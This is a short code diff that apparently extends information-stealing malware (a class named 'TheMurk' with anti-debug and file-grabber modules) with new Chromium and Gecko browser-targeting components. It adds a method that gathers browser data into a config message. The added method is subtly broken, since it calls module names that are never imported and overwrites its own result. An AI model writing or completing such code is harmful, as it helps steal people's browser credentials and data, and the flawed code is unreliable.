@@ -3,6 +3,8 @@ from manager.antiDebug import AntiDebug
 from manager.folders import Folders
 from targets.files.files import TxtFiles
 from targets.files.file_grabber import Grab
+from targets.browsers.chromium import Chromium
+from targets.browsers.geckodriver import GeckoDriver
 
 class TheMurk:
     def __init__(self) -> None:
@@ -34,3 +36,8 @@ class TheMurk:
             self.msgFiles = Grab(self.msgFiles)
         else:
             TxtFiles()
+    
+    def Browsers(self):
+        chromium.Browsers()
+        Config.msgBrowsers = chromium.Browsers.Return()
+        Config.msgBrowsers = geckodriver.GeckoDriver(Config.msgBrowsers)
